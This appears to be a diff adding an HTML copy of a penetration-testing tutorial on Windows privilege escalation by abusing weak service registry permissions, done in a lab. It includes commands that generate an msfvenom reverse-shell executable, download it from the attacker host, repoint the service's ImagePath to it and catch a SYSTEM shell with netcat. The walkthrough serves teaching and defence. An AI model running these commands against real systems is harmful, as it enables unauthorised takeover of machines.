@@ -1,0 +1,113 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Privilege Escalation: Weak Registry Permission</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/" rel="bookmark"><time class="entry-date published" datetime="2021-10-19T17:32:19+00:00">October 19, 2021</time><time class="updated" datetime="2025-05-10T20:28:31+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Microsoft Windows offers a wide range of fine-grained permissions and privileges for controlling access to Windows components including services, files, and registry entries. Exploiting <strong>Weak Registry Permissions</strong> is one technique to increase privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://lh3.googleusercontent.com/-bCiNLUqalOU/YW7h5hJwHlI/AAAAAAAAy-Y/4yfCeaP-0zwrnZbwFxMQGLOQ7Aaeii_WwCLcBGAsYHQ/s16000/image.png"/></span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><strong><span style="color: #000000;">Introduction</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Windows Registry</span></li>
+<li><span style="color: #000000;">Registry Hive</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Weak Registry Permission</span></strong></p>
+<p><strong><span style="color: #000000;">Prerequisite</span></strong></p>
+<p><strong><span style="color: #000000;">Lab Setup</span></strong></p>
+<p><strong><span style="color: #000000;">Abusing Weak Registry Services</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Enumerate Vulnerable Registry key using Accesschk.exe</span></li>
+<li><span style="color: #000000;">Enumerate Vulnerable Registry key using Powershell</span></li>
+<li><span style="color: #000000;">Enumerate Vulnerable Registry key using WinPEASx64</span></li>
+<li><span style="color: #000000;">Create Malicious Executable</span></li>
+</ul>
+<h3><span style="color: #800000;">Introduction</span></h3>
+<p><span style="color: #000000;"><strong>Windows Registry </strong></span></p>
+<p><span style="color: #000000;">The registry is a system-defined database in which applications and system components store and retrieve configuration data. The registry is a hierarchical database that contains data that is critical for the operation of Windows and the applications and services that run on Windows.</span></p>
+<p><span style="color: #000000;"><strong>You can use Registry Editor to do the following actions:</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Locate a subtree, key, subkey, or value</span></li>
+<li><span style="color: #000000;">Add a subkey or a value</span></li>
+<li><span style="color: #000000;">Change a value</span></li>
+<li><span style="color: #000000;">Delete a subkey or a value</span></li>
+<li><span style="color: #000000;">Rename a subkey or a value</span></li>
+</ul>
+<p><span style="color: #000000;">The data is structured in a tree format. Each node in the tree is called a key. Each key can contain both subkeys and data entries called values.</span></p>
+<p><span style="color: #000000;"><strong>Registry Hive</strong></span></p>
+<p><span style="color: #000000;">A hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.</span></p>
+<p><span style="color: #000000;"><strong><em>Note:</em></strong><em> Each time a new user logs on to a computer, a new hive is created for that user with a separate file for the user profile. This is called the user profile hive. A user’s hive contains specific registry information pertaining to the user’s application settings, desktop, environment, network connections, and printers. User profile hives are located under the HKEY_USERS key.</em></span></p>
+<p><span style="color: #000000;">Most of the supporting files for the hives are in the %SystemRoot%\System32\Config directory. These files are updated each time a user logs on.</span></p>
+<p><span style="color: #000000;">The following table lists the standard hives and their supporting files.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEivamgg3uYA1YlfZO1hp2pqcdYqWBAfTCurPbFZYkEKYCDjOBe2Bs_rPGHj_YwsCJwaqgadtKgA5XUCBRdO1nErJeZNEPzhWnhpyOMMEdq8s5eF9yEdGy2wA9CwE2rF62gle_by4sxXSEnugKOwlUo47S_Tf7i8vrLxcpi4agh9bEpWPR1a4UYCLQ_0qw=s16000"/></strong></span></p>
+<h3><span style="color: #800000;">Weak Registry Permission</span></h3>
+<p><span style="color: #000000;">By hijacking the Registry entries utilized by services, attackers can run their malicious payloads. Attackers may use weaknesses in registry permissions to divert from the initially stated executable to one they control upon Service start, allowing them to execute their unauthorized malware.</span></p>
+<p><span style="color: #000000;"><strong>Mitre ID:</strong> T1574.011</span></p>
+<p><span style="color: #000000;"><strong>Tactics:</strong> Privilege Escalation &amp; Persistence</span></p>
+<p><span style="color: #000000;"><strong>Platforms:</strong> Windows</span></p>
+<h3><span style="color: #800000;">Prerequisite</span></h3>
+<p><span style="color: #000000;"><strong>Target Machine:</strong> Windows 10</span></p>
+<p><span style="color: #000000;"><strong>Attacker Machine:</strong> Kali Linux</span></p>
+<p><span style="color: #000000;"><strong>Tools: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/Ignitetechnologies/OSCP_Tools/blob/main/subinacl.msi">SubinACL</a></span></strong>, <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUP.ps1</a></strong></span>, <strong><a style="color: #000000;" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"><span style="color: #0000ff;">Winpeas</span></a></strong><strong>.</strong></span></p>
+<p><span style="color: #000000;"><strong>Condition:</strong> Compromise the target machine with low privilege access either using Metasploit or Netcat, etc.</span></p>
+<p><span style="color: #000000;"><strong>Objective:</strong> Escalate the NT Authority /SYSTEM privileges for a low privileged user by exploiting the Weak Registry Key.</span></p>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;"><strong>Step 1:</strong> Run CMD as administrator and execute the below command to create a service with the name of Pentest inside /temp directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc.exe create pentest binPath= "C:\temp\service.exe"</pre>
+<p><span style="color: #000000;"><strong>Step2:</strong> To create a vulnerable service we need to assign some toxic privilege with the help of <strong><a style="color: #000000;" href="https://github.com/Ignitetechnologies/OSCP_Tools/blob/main/subinacl.msi">SubinACL</a></strong><strong> </strong>to change the permission of services.</span></p>
+<p><span style="color: #000000;"><strong>NOTE</strong>:</span></p>
+<p><span style="color: #000000;"><em>SubInACL is a little-known command-line tool from Microsoft, yet it is one of the best tools to work with security permissions in Windows. This tool is capable of changing the permissions of files, folders, registry keys, services, printers, cluster shares and various other types of objects.</em></span></p>
+<p><span style="color: #000000;"><em>In this case, we have granted a user permissions to suspend (pause/continue), start and stop (restart) a service.</em></span></p>
+<p><span style="color: #000000;"><strong>Step3:</strong> After downloading SubinACL, execute the following command to assign <strong>PTO Permissions </strong>user “ignite” against “Pentest” service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Program Files (x86)\Windows Resource Kits\Tools
+subinacl.exe /service pentest /grant=msedgewin10\ignite=PTO</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgnHrrXIkF_P4TCA-bdGvDVBBRGUS6lBJrMm9RxUmszSozvnhC_cK3EQnlsJ2_JkkVWr3sUWmOSvAPPOnyHb27P7iyfeNaEnhY9_KndFwbct6Qv9sxoCUMMJuCvykGKFaUm84gToNrLB6Ynq6Ux52K4dpoWpuNBzOutLMWsyTZluczFXyIa6aY2eCRWJw=s16000"/></span></p>
+<p><span style="color: #000000;">Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services.</span></p>
+<p><span style="color: #000000;"><strong>Step4: </strong>Explore registry path <strong>HKLM\SYSTEM\CurrentControlSet\Services\pentest</strong> and change permission for it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgO0yGZJlcrTmIBgNrlTptP8r3V0PHH9w0BjmByTRF-tA60yUKsTPxTyim43H2ALSPvts8bKAWj04W2vBflmqGZoJIUX1lS_QzgPOPTGElEb-Q8Txfcum7C-yagYLLNRMJsdDpxP20mkUJeC0qo9IpYmc9E8osJVSd_jhlEJ_bXMM6Td_bzRZuk8gZSYQ=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step5:</strong> Allow FULL Control on Authenticate user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEisQYXgiiPRboaiBJsp6vQ_kMk6YlRBsFDDn_-Tz6gnKN39uFyjiI4gsR3riLEaLdeJ6U9wAiB1QDCNmfhnO4vO8MBvna1j8VHB8bZeNjl3RdpGnBGRCGb_8ySFFQbS2lGfakik8lypJ36QlwJjWEKlbSGL52_OQ5ZJ8b5-F45qA-zogVV0qLO_Ju-KTA=s16000"/></span></p>
+<h3><span style="color: #800000;">Abusing Weak Registry Services</span></h3>
+<p><span style="color: #000000;"><strong>Enumerate Vulnerable Registry key using </strong><strong>Accesschk.exe</strong></span></p>
+<p><span style="color: #000000;">An attacker can escalate privileges by exploiting Weak Registry permission if the current user has permission to alter Registry keys associated with the service.</span></p>
+<p><span style="color: #000000;">Following an initial foothold, we can query for service registry keys permissions using the accesschk.exe Sysinternals tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 1245
+accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services</pre>
+<p><span style="color: #000000;">As result, we found ALL Access is assigned for the authenticated user for the “<strong>Pentest</strong>” registry key.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjeM9_EqcXvR4b_DlDIIPR2AX1t5knDun81d6GtDieZsBiLdDXeY9tESH2E_C4uNu3XIGxAPGdzsOUfJ251C4hXWyHwkSNfevgs_Mq2_phkKd3iFjZV6Ws9a9R_OADJQObgQGVZRBEaH3PiupLPASCA7luiDSCqmMbWZjwovhM7Y9kCDC4V_ya-Xm4-cA=s16000"/></span></p>
+<p><span style="color: #000000;">With the following command, we query for the image path for service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pentest</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiWn1TRiRgkZCU6gYL_077SvIV8m4eWckS_sgfALlC8MQCy_dQgz6xcR2eR67ZPLTfGK-7nboV-PxsjQmyYVTqDTjDf_Et7mykOKkVioHByscGxIqNI79n6k_fNH2PX-lZl8-8x8PDfXVeS5aHr5Ix_p01gAMdnoahmqvFaw3NjwS3OJYjIJvyNTPWYEA=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Enumerate Vulnerable Registry key using </strong><strong>Powershell</strong></span></p>
+<p><span style="color: #000000;">With the help of PowerShell, you check the Access Control List (ACL) to enumerate the user privileges full control upon the service registry key.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\pentest | fl</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg5ZoaVH_HxFLQ8bMD5bpO98TVHHu0BclIaZ5zU286zDx10n7NUu481yq8W4IPyZALgnCBkyslt_RG7FD42b0I2CNAuqKuBhyhG2MO45QPGQM6XIcfuY8N7E-g5a9cmBL7VdcQKOoKgX-Xzja1fsfx_v_DYh4ArepTSiVK9etUJkkdZzMWsUG5YDM-mJQ=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Enumerate Vulnerable Registry key using </strong><strong>WinPEASx64</strong></span></p>
+<p><span style="color: #000000;">Even, using auto script <strong>WinPEASx64</strong> we enumerate weak service registry which is another method post enumeration for weak configuration.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEisiosAwgUASv1pt6hbH0JwXt2igzFr9lJruNBpv3uGkNfCNoiuSzhctrmO3_fZAOqLjoQQz5462a3GB06nwlzBeHQpnrXPRkLfBwPMU-pR4YhNpMSilGeAUBGDgy7a2KbviCuldEdoDRHCYqpUSma-TuPum_xzo5Z19hBMtRnOApWNLglFRvZ8_SrBGg=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Create Malicious Executable </strong></span></p>
+<p><span style="color: #000000;">If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service <a style="color: #000000;" href="https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/">binPath</a>/ImagePath to point to a different executable under their control.</span></p>
+<p><span style="color: #000000;">Create an executable shell and install it on the victim’s machine, then modify the service registry key to an executable since the authenticated user has full access to the service and therefore has the ability to change the image path for service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom –p window/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe &gt; shell.exe
+python –m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjjj8oQFj8yDclkgn0FmHJok6Jxu9fYaMroYKoCoBt4FQx4geQQe92rxEIx8PQ7GCyJeOd5e7AlxVnWcPIpcP1lSoiIULET1UBcxXpSInADiCfTNFYvsAVuAZtowxokHYh1PsZZndFGNNkvdIdPOXKf_CsprnlzGLmi3otcFqJRXf2i2UOpfTya55Tysg=s16000"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\Users\public
+powershell wget http://192.168.1.3/shell.exe -o shell.exe
+dir
+reg add "HKLM\system\currentcontrolset\services\pentest" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\shell.exe" /f</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh4TdDofRadomtsV_V-8VBD_QMC-dWXHPEb3Bz8JVwhSnjShZM08mPq9OZw2MJkpTZVBuWxKNQGIWBicmnPUsuKfuSYd_fVHA2AYNzq6NqQ-QdtK1UcV5837AZ5L5mi3yhApNjnIvb63D5KbrA5HPzH1dfd_E9F8F1_janHcdGiBxDy88Dx99MX8xia4g=s16000"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net start pentest</pre>
+<p><span style="color: #000000;">When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).</span></p>
+<p><span style="color: #000000;">Thus as soon as the service will launch, the attacker will get a reverse connection in the new netcat session as NT Authority \system</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 8888
+whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A0Y7dc2Jkws/YW7kqJ86laI/AAAAAAAAy_0/E9my9Bsp7mMr5dABVaLGNOU3g-WHsIatQCLcBGAsYHQ/s16000/59.png"/></span></p>
+<h3><span style="color: #800000;">References</span></h3>
+<p><strong><span style="color: #0000ff;"><a style="color: #0000ff; text-decoration: underline;" href="https://attack.mitre.org/techniques/T1574/011/">https://attack.mitre.org/techniques/T1574/011/</a></span></strong></p>
+<p><strong><span style="color: #0000ff;">https://docs.microsoft.com/en-us/windows/win32/sysinfo/registr</span></strong></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><strong><a href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
